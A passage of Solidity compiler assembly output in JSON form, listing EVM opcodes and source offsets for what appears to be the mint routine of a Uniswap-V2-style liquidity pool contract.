											"end": 7,
											"name": "PUSH [tag]",
											"value": "196"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "196"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "POP"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "POP"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "POP"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "POP"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "MLOAD"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "197"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "197"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "MLOAD"
										},
										{
											"begin": 5149,
											"end": 5155,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 5149,
											"end": 5155,
											"name": "SLOAD"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "DUP1"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "DUP2"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "MSTORE"
										},
										{
											"begin": 5175,
											"end": 5179,
											"name": "ADDRESS"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "DUP3"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "ADD"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "MSTORE"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "SWAP1"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "MLOAD"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "SWAP3"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5126,
											"end": 5139,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5126,
											"end": 5139,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5149,
											"end": 5155,
											"name": "SWAP1"
										},
										{
											"begin": 5149,
											"end": 5155,
											"name": "SWAP3"
										},
										{
											"begin": 5149,
											"end": 5155,
											"name": "AND"
										},
										{
											"begin": 5149,
											"end": 5155,
											"name": "SWAP2"
										},
										{
											"begin": 5142,
											"end": 5166,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 5142,
											"end": 5166,
											"name": "SWAP2"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "DUP1"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "DUP3"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "ADD"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "SWAP3"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "SWAP3"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "SWAP1"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "SWAP2"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "SWAP1"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "DUP3"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "SWAP1"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "SUB"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "ADD"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "DUP2"
										},
										{
											"begin": 5149,
											"end": 5155,
											"name": "DUP7"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "DUP1"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "198"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "198"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "POP"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "GAS"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "STATICCALL"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "199"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "199"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "POP"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "POP"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "POP"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "POP"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "MLOAD"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "200"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "200"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "MLOAD"
										},
										{
											"begin": 5142,
											"end": 5181,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5191,
											"end": 5203,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5206,
											"end": 5229,
											"name": "PUSH [tag]",
											"value": "201"
										},
										{
											"begin": 5206,
											"end": 5214,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5206,
											"end": 5229,
											"name": "DUP8"
										},
										{
											"begin": 5206,
											"end": 5229,
											"name": "AND"
										},
										{
											"begin": 5206,
											"end": 5229,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5206,
											"end": 5218,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 5206,
											"end": 5229,
											"name": "AND"
										},
										{
											"begin": 5206,
											"end": 5229,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5206,
											"end": 5229,
											"name": "tag",
											"value": "201"
										},
										{
											"begin": 5206,
											"end": 5229,
											"name": "JUMPDEST"
										},
										{
											"begin": 5191,
											"end": 5229,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5239,
											"end": 5251,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5254,
											"end": 5277,
											"name": "PUSH [tag]",
											"value": "202"
										},
										{
											"begin": 5254,
											"end": 5262,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5254,
											"end": 5277,
											"name": "DUP8"
										},
										{
											"begin": 5254,
											"end": 5277,
											"name": "AND"
										},
										{
											"begin": 5254,
											"end": 5277,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5254,
											"end": 5266,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 5254,
											"end": 5277,
											"name": "AND"
										},
										{
											"begin": 5254,
											"end": 5277,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5254,
											"end": 5277,
											"name": "tag",
											"value": "202"
										},
										{
											"begin": 5254,
											"end": 5277,
											"name": "JUMPDEST"
										},
										{
											"begin": 5239,
											"end": 5277,
											"name": "SWAP1"
										},
										{
											"begin": 5239,
											"end": 5277,
											"name": "POP"
										},
										{
											"begin": 5288,
											"end": 5298,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5301,
											"end": 5331,
											"name": "PUSH [tag]",
											"value": "203"
										},
										{
											"begin": 5310,
											"end": 5319,
											"name": "DUP8"
										},
										{
											"begin": 5321,
											"end": 5330,
											"name": "DUP8"
										},
										{
											"begin": 5301,
											"end": 5309,
											"name": "PUSH [tag]",
											"value": "204"
										},
										{
											"begin": 5301,
											"end": 5331,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5301,
											"end": 5331,
											"name": "tag",
											"value": "203"
										},
										{
											"begin": 5301,
											"end": 5331,
											"name": "JUMPDEST"
										},
										{
											"begin": 5341,
											"end": 5358,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5361,
											"end": 5372,
											"name": "SLOAD"
										},
										{
											"begin": 5288,
											"end": 5331,
											"name": "SWAP1"
										},
										{
											"begin": 5288,
											"end": 5331,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5464,
											"end": 5481,
											"name": "DUP1"
										},
										{
											"begin": 5460,
											"end": 5854,
											"name": "PUSH [tag]",
											"value": "205"
										},
										{
											"begin": 5460,
											"end": 5854,
											"name": "JUMPI"
										},
										{
											"begin": 5509,
											"end": 5563,
											"name": "PUSH [tag]",
											"value": "206"
										},
										{
											"begin": 443,
											"end": 450,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 5509,
											"end": 5540,
											"name": "PUSH [tag]",
											"value": "169"
										},
										{
											"begin": 5519,
											"end": 5539,
											"name": "PUSH [tag]",
											"value": "208"
										},
										{
											"begin": 5519,
											"end": 5526,
											"name": "DUP8"
										},
										{
											"begin": 5531,
											"end": 5538,
											"name": "DUP8"
										},
										{
											"begin": 5519,
											"end": 5539,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5519,
											"end": 5530,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 5519,
											"end": 5539,
											"name": "AND"
										},
										{
											"begin": 5519,
											"end": 5539,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5519,
											"end": 5539,
											"name": "tag",
											"value": "208"
										},
										{
											"begin": 5519,
											"end": 5539,
											"name": "JUMPDEST"
										},
										{
											"begin": 5509,
											"end": 5518,
											"name": "PUSH [tag]",
											"value": "209"
										},
										{
											"begin": 5509,
											"end": 5540,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5509,
											"end": 5563,
											"name": "tag",
											"value": "206"
										},
										{
											"begin": 5509,
											"end": 5563,
											"name": "JUMPDEST"
										},
										{
											"begin": 5497,
											"end": 5563,
											"name": "SWAP9"
										},
										{
											"begin": 5497,
											"end": 5563,
											"name": "POP"
										},
										{
											"begin": 5577,
											"end": 5613,
											"name": "PUSH [tag]",
											"value": "210"
										},
										{
											"begin": 5591,
											"end": 5592,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 443,
											"end": 450,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 5577,
											"end": 5582,
											"name": "PUSH [tag]",
											"value": "211"
										},
										{
											"begin": 5577,
											"end": 5613,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5577,
											"end": 5613,
											"name": "tag",
											"value": "210"
										},
										{
											"begin": 5577,
											"end": 5613,
											"name": "JUMPDEST"
										},
										{
											"begin": 5460,
											"end": 5854,
											"name": "PUSH [tag]",
											"value": "212"
										},
										{
											"begin": 5460,
											"end": 5854,
											"name": "JUMP"
										},
										{
											"begin": 5460,
											"end": 5854,
											"name": "tag",
											"value": "205"
										},
										{
											"begin": 5460,
											"end": 5854,
											"name": "JUMPDEST"
										},
										{
											"begin": 5711,
											"end": 5843,
											"name": "PUSH [tag]",
											"value": "213"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5737,
											"end": 5774,
											"name": "DUP10"
										},
										{
											"begin": 5737,
											"end": 5774,
											"name": "AND"
										},
										{
											"begin": 5737,
											"end": 5762,
											"name": "PUSH [tag]",
											"value": "214"
										},
										{
											"begin": 5737,
											"end": 5744,
											"name": "DUP7"
										},
										{
											"begin": 5749,
											"end": 5761,
											"name": "DUP5"
										},
										{
											"begin": 5737,
											"end": 5762,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5737,
											"end": 5748,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 5737,
											"end": 5762,
											"name": "AND"
										},
										{
											"begin": 5737,
											"end": 5762,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5737,
											"end": 5762,
											"name": "tag",
											"value": "214"
										},
										{
											"begin": 5737,
											"end": 5762,
											"name": "JUMPDEST"
										},
										{
											"begin": 5737,
											"end": 5774,
											"name": "DUP2"
										},
										{
											"begin": 5737,
											"end": 5774,
											"name": "PUSH [tag]",
											"value": "215"
										},
										{
											"begin": 5737,
											"end": 5774,
											"name": "JUMPI"
										},
										{
											"begin": 5737,
											"end": 5774,
											"name": "INVALID"
										},
										{
											"begin": 5737,
											"end": 5774,
											"name": "tag",
											"value": "215"
										},
										{
											"begin": 5737,
											"end": 5774,
											"name": "JUMPDEST"
										},
										{
											"begin": 5737,
											"end": 5774,
											"name": "DIV"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5792,
											"end": 5829,
											"name": "DUP10"
										},
										{
											"begin": 5792,
											"end": 5829,
											"name": "AND"
										},
										{
											"begin": 5792,
											"end": 5817,
											"name": "PUSH [tag]",
											"value": "216"
										},
										{
											"begin": 5792,
											"end": 5799,
											"name": "DUP7"
										},
										{
											"begin": 5804,
											"end": 5816,
											"name": "DUP6"
										},
										{
											"begin": 5792,
											"end": 5817,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5792,
											"end": 5803,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 5792,
											"end": 5817,
											"name": "AND"
										},
										{
											"begin": 5792,
											"end": 5817,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5792,
											"end": 5817,
											"name": "tag",
											"value": "216"
										},
										{
											"begin": 5792,
											"end": 5817,
											"name": "JUMPDEST"
										},
										{
											"begin": 5792,
											"end": 5829,
											"name": "DUP2"
										},
										{
											"begin": 5792,
											"end": 5829,
											"name": "PUSH [tag]",
											"value": "217"
										},
										{
											"begin": 5792,
											"end": 5829,
											"name": "JUMPI"
										},
										{
											"begin": 5792,
											"end": 5829,
											"name": "INVALID"
										},
										{
											"begin": 5792,
											"end": 5829,
											"name": "tag",
											"value": "217"
										},
										{
											"begin": 5792,
											"end": 5829,
											"name": "JUMPDEST"
										},
										{
											"begin": 5792,
											"end": 5829,
											"name": "DIV"
										},
										{
											"begin": 5711,
											"end": 5719,
											"name": "PUSH [tag]",
											"value": "218"
										},
										{
											"begin": 5711,
											"end": 5843,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5711,
											"end": 5843,
											"name": "tag",
											"value": "213"
										},
										{
											"begin": 5711,
											"end": 5843,
											"name": "JUMPDEST"
										},
										{
											"begin": 5699,
											"end": 5843,
											"name": "SWAP9"
										},
										{
											"begin": 5699,
											"end": 5843,
											"name": "POP"
										},
										{
											"begin": 5460,
											"end": 5854,
											"name": "tag",
											"value": "212"
										},
										{
											"begin": 5460,
											"end": 5854,
											"name": "JUMPDEST"
										},
										{
											"begin": 5883,
											"end": 5884,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5871,
											"end": 5880,
											"name": "DUP10"
										},
										{
											"begin": 5871,
											"end": 5884,
											"name": "GT"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "PUSH [tag]",
											"value": "219"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "JUMPI"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "DUP2"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "MSTORE"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "ADD"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "DUP1"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "DUP1"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "ADD"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "DUP3"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "DUP2"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "SUB"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "DUP3"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "MSTORE"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "DUP2"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "MSTORE"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "ADD"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "DUP1"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "PUSH data",
											"value": "EF633320352A650C1D75752F13E6C73D8D8F7F26A5596A6D026C1BF50D2F7713"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "SWAP2"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "CODECOPY"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "ADD"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "SWAP2"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "POP"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "POP"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "MLOAD"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "DUP1"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "SWAP2"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "SUB"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "SWAP1"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "REVERT"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "tag",
											"value": "219"
										},
										{
											"begin": 5863,
											"end": 5927,
											"name": "JUMPDEST"
										},
										{
											"begin": 5937,
											"end": 5957,
											"name": "PUSH [tag]",
											"value": "220"
										},
										{
											"begin": 5943,
											"end": 5945,
											"name": "DUP11"
										},
										{
											"begin": 5947,
											"end": 5956,
											"name": "DUP11"
										},
										{
											"begin": 5937,
											"end": 5942,
											"name": "PUSH [tag]",
											"value": "211"
										},
										{
											"begin": 5937,
											"end": 5957,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5937,
											"end": 5957,
											"name": "tag",
											"value": "220"
										},
										{
											"begin": 5937,
											"end": 5957,
											"name": "JUMPDEST"
										},
										{
											"begin": 5968,
											"end": 6017,
											"name": "PUSH [tag]",
											"value": "221"
										},
										{
											"begin": 5976,
											"end": 5984,
											"name": "DUP7"
										},
										{
											"begin": 5986,
											"end": 5994,
											"name": "DUP7"
										},
										{
											"begin": 5996,
											"end": 6005,
											"name": "DUP11"
										},
										{
											"begin": 6007,
											"end": 6016,
											"name": "DUP11"
										},
										{
											"begin": 5968,
											"end": 5975,
											"name": "PUSH [tag]",
											"value": "179"
										},
										{
											"begin": 5968,
											"end": 6017,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5968,
											"end": 6017,
											"name": "tag",
											"value": "221"
										},
										{
											"begin": 5968,
											"end": 6017,
											"name": "JUMPDEST"
										},
										{
											"begin": 6031,
											"end": 6036,
											"name": "DUP2"
										},
										{
											"begin": 6027,
											"end": 6074,
											"name": "ISZERO"
										},
										{
											"begin": 6027,
											"end": 6074,
											"name": "PUSH [tag]",
											"value": "222"
										},
										{
											"begin": 6027,
											"end": 6074,
											"name": "JUMPI"
										},
										{
											"begin": 6065,
											"end": 6073,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 6065,
											"end": 6073,
											"name": "SLOAD"
										},
										{
											"begin": 6046,
											"end": 6074,
											"name": "PUSH [tag]",
											"value": "223"
										},
										{
											"begin": 6046,
											"end": 6074,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6051,
											"end": 6059,
											"name": "DUP1"
										},
										{
											"begin": 6051,
											"end": 6059,
											"name": "DUP3"
										},
										{
											"begin": 6051,
											"end": 6059,
											"name": "AND"
										},
										{
											"begin": 6051,
											"end": 6059,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 6065,
											"end": 6073,
											"name": "SWAP1"
										},
										{
											"begin": 6065,
											"end": 6073,
											"name": "DIV"
										},
										{
											"begin": 6065,
											"end": 6073,
											"name": "AND"
										},
										{
											"begin": 6046,
											"end": 6074,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 6046,
											"end": 6064,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 6046,
											"end": 6074,
											"name": "AND"
										},
										{
											"begin": 6046,
											"end": 6074,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6046,
											"end": 6074,
											"name": "tag",
											"value": "223"
										},
										{
											"begin": 6046,
											"end": 6074,
											"name": "JUMPDEST"
										},
										{
											"begin": 6038,
											"end": 6043,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 6038,
											"end": 6074,
											"name": "SSTORE"
										},
										{
											"begin": 6027,
											"end": 6074,
											"name": "tag",
											"value": "222"
										},
										{
											"begin": 6027,
											"end": 6074,
											"name": "JUMPDEST"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "DUP1"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "MLOAD"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "DUP6"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "DUP2"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "MSTORE"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "DUP2"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "ADD"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "DUP6"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "SWAP1"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "MSTORE"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "DUP2"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "MLOAD"
										},
										{
											"begin": 6134,
											"end": 6144,
											"name": "CALLER"
										},
										{
											"begin": 6134,
											"end": 6144,
											"name": "SWAP3"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "PUSH",
											"value": "4C209B5FC8AD50758F13E2E1088BA56A560DFF690A1C6FEF26394F4C03821C4F"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "SWAP3"
										},
										{
